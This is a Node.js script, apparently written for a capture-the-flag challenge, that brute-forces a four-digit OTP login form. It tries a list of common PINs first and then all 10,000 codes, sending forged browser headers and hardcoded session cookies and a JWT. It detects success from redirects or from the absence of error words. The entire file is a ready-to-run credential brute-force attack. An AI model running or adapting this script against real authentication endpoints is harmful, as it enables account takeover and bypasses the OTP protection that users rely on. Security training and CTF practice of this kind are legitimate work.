require('dotenv').config();
const axios = require('axios');

const CONFIG = {
    target: process.env.TARGET_HOST,
    endpoint: process.env.TARGET_ENDPOINT || '/phase1/auth/otp_challenge',
    timeout: 5000,
    delayBetweenRequests: 100
};

const HEADERS = {
    'Host': new URL(CONFIG.target).hostname,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-GB,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': `${CONFIG.target}${CONFIG.endpoint}`,
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': CONFIG.target,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive'
};

const COOKIES = {
    'Hidden-Flag-Part': process.env.COOKIE_HIDDEN_FLAG_PART || 'Check_The_Headers_Instead',
    'UserData': process.env.COOKIE_USER_DATA || 'VXNlcjpBZG1pbnxDcmVkaXRDYXJkOjQ0NDQtNTU1NS02NjY2LTc3Nzd8RmxhZzpNZXJkZWthU2liZXJ7VW4zbmNyeXB0M2RfQzAwazEzX1AxMX0=',
    'IsAdmin': process.env.COOKIE_IS_ADMIN || '0',
    'session': process.env.COOKIE_SESSION || '.eJyrViooSo1PLC3JiC8tTi1SslJKTMnNzFPSUSouSS0wjE_Jz0tVsiopKk2FiBghidQCAKe-FfM.adsJ4Q.vJukFR-ExxzqgIeI1dufluQzDXU',
    'accessToken': process.env.COOKIE_ACCESS_TOKEN || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYWE4MWU2My1jNWVjLTRhYjAtODhjZi0yODE4NzhlNWMxZTEiLCJyb2xlIjoiUEFSVElDSVBBTlQiLCJpYXQiOjE3NzYyMzc0ODIsImV4cCI6MTc3NjIzODM4Mn0.jS2QQc__LPTGgMxLsIA2SRaRAR0l93ylHKvoWgrQE5Q'
};

const COMMON_OTPS = [
    '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
    '1234', '4321', '0123', '3210',
    '1337', '8008', '0007', '0070',
    '2024', '2025', '2023',
    '1024', '2048', '4096',
    '1212', '2121', '1221', '2112',
    '1122', '2211',
    '1010', '0101',
    '1000', '2000', '3000', '4000', '5000', '6000', '7000', '8000', '9000',
    '0100', '0200', '0300', '0400', '0500', '0600', '0700', '0800', '0900',
    '0010', '0020', '0030', '0040', '0050', '0060', '0070', '0080', '0090',
    '0001', '0002', '0003', '0004', '0005', '0006', '0007', '0008', '0009',
    '2580', '0852', '8520', '5208',
    '1598', '9875', '7531', '3579',
    '2468', '8642',
    '9511', '5115', '1159',
    '9999', '8888', '7777', '6666', '5555', '4444', '3333', '2222', '1111', '0000'
];

function buildCookieString() {
    return Object.entries(COOKIES)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');
}

async function tryOTP(otp) {
    const cookieString = buildCookieString();
    const otpFormatted = otp.toString().padStart(4, '0');
    
    try {
        const response = await axios.post(
            `${CONFIG.target}${CONFIG.endpoint}`,
            `otp=${otpFormatted}`,
            {
                headers: {
                    ...HEADERS,
                    'Cookie': cookieString,
                    'Content-Length': `otp=${otpFormatted}`.length.toString()
                },
                timeout: CONFIG.timeout,
                maxRedirects: 0,
                validateStatus: () => true
            }
        );
        
        return {
            otp: otpFormatted,
            status: response.status,
            success: isSuccess(response),
            headers: response.headers,
            data: response.data
        };
    } catch (error) {
        return {
            otp: otpFormatted,
            status: error.response?.status || 'ERROR',
            success: false,
            error: error.message
        };
    }
}

function isSuccess(response) {
    if (response.status === 302 || response.status === 301) {
        return true;
    }
    
    if (response.status === 200) {
        const data = response.data;
        if (typeof data === 'string') {
            const lowerData = data.toLowerCase();
            
            const errorPatterns = [
                'otp salah',
                'coba lagi',
                'salah',
                'incorrect',
                'invalid',
                'wrong',
                'gagal',
                'error'
            ];
            
            const hasError = errorPatterns.some(pattern => lowerData.includes(pattern));
            
            if (!hasError) {
                return true;
            }
        }
    }
    
    return false;
}

async function tryCommonOTPs() {
    console.log('🎯 Phase 1: Trying common CTF OTPs');
    console.log(`📊 Total common OTPs to try: ${COMMON_OTPS.length}`);
    console.log('🔍 This includes: repeated digits, sequential, years, PIN patterns, CTF-specific\n');
    
    const startTime = Date.now();
    let attempts = 0;
    let successfulOTP = null;
    
    for (const otp of COMMON_OTPS) {
        attempts++;
        
        const result = await tryOTP(otp);
        
        console.log(`🔑 Trying: ${otp}... ${result.success ? '✅ SUCCESS!' : '❌ Invalid'}`);
        
        if (result.success) {
            successfulOTP = result;
            console.log('\n🎉 OTP FOUND in common patterns!');
            console.log(`\n🔑 OTP Code: ${result.otp}`);
            console.log(`📊 Status: ${result.status}`);
            console.log(`⏱️  Total attempts: ${attempts}`);
            console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
            
            if (result.headers) {
                console.log(`📍 Location: ${result.headers['location'] || result.headers['Location'] || 'N/A'}`);
            }
            
            break;
        }
        
        await new Promise(resolve => setTimeout(resolve, CONFIG.delayBetweenRequests));
    }
    
    if (!successfulOTP) {
        console.log(`\n❌ No valid OTP found in ${attempts} common patterns`);
        console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
    }
    
    return { found: !!successfulOTP, result: successfulOTP, attempts };
}

async function bruteForceSequential() {
    console.log('\n🔥 Phase 2: Full Brute Force Attack');
    console.log(`📊 Range: 0000 - 9999`);
    console.log(`🎯 Target: ${CONFIG.target}${CONFIG.endpoint}`);
    console.log(`⏱️  Timeout: ${CONFIG.timeout}ms per request\n`);
    
    const startTime = Date.now();
    let attempts = 0;
    let successfulOTP = null;
    
    for (let otp = 0; otp <= 9999 && !successfulOTP; otp++) {
        attempts++;
        
        const result = await tryOTP(otp);
        
        if (attempts % 100 === 0) {
            const elapsed = Date.now() - startTime;
            const rate = (attempts / (elapsed / 1000)).toFixed(2);
            console.log(`📈 Progress: ${attempts} attempts | ${(attempts / 100).toFixed(1)}% complete | Rate: ${rate} req/s`);
        }
        
        if (result.success) {
            successfulOTP = result;
            console.log('\n✅ SUCCESS! Valid OTP found!\n');
            console.log(`🔑 OTP Code: ${result.otp}`);
            console.log(`📊 Status: ${result.status}`);
            console.log(`⏱️  Total attempts: ${attempts}`);
            console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
            
            if (result.headers) {
                console.log(`📍 Location: ${result.headers['location'] || result.headers['Location'] || 'N/A'}`);
            }
            
            break;
        }
        
        await new Promise(resolve => setTimeout(resolve, CONFIG.delayBetweenRequests));
    }
    
    if (!successfulOTP) {
        console.log('\n❌ No valid OTP found in the specified range');
        console.log(`📊 Total attempts: ${attempts}`);
        console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
    }
    
    return successfulOTP;
}

async function main() {
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║  Smart OTP Brute Force - CTF Common Patterns First        ║');
    console.log('║     Educational Purpose Only - Authorized Environment      ║');
    console.log('╚════════════════════════════════════════════════════════════╝\n');
    
    try {
        const phase1 = await tryCommonOTPs();
        
        if (phase1.found) {
            console.log('\n🏆 Challenge completed! No need for full brute force.');
        } else {
            console.log('\n💡 Common patterns exhausted. Starting full brute force...');
            console.log('⚠️  This will take ~15-20 minutes. Press Ctrl+C to stop.\n');
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            await bruteForceSequential();
        }
    } catch (error) {
        console.error('❌ Error:', error.message);
    }
}

if (require.main === module) {
    main();
}

module.exports = { tryOTP, tryCommonOTPs, bruteForceSequential };
